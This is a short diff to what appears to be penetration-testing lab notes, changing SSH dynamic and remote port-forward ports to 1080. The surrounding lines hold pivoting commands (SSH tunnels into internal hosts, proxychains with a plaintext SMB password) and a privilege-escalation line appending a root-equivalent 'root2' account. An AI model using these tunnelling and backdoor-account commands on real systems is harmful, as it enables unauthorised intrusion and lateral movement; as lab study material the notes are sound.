@@ -765,7 +765,7 @@ joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /et
 ssh -L 4455:172.16.50.217:445 database_admin@10.4.50.215
 # l Dynamic
 ## proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
-ssh -D 0.0.0.0:9999 database_admin@10.4.50.215
+ssh -D 0.0.0.0:1080 database_admin@10.4.50.215
 tail /etc/proxychains4.conf
 
 # remote
@@ -773,7 +773,7 @@ sudo systemctl start ssh
 
 ssh -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
 # r Dynamic
-ssh -R 9998 kali@192.168.118.4
+ssh -R 1080 kali@192.168.118.4
 tail /etc/proxychains4.conf
 ```
 #### sshuttle
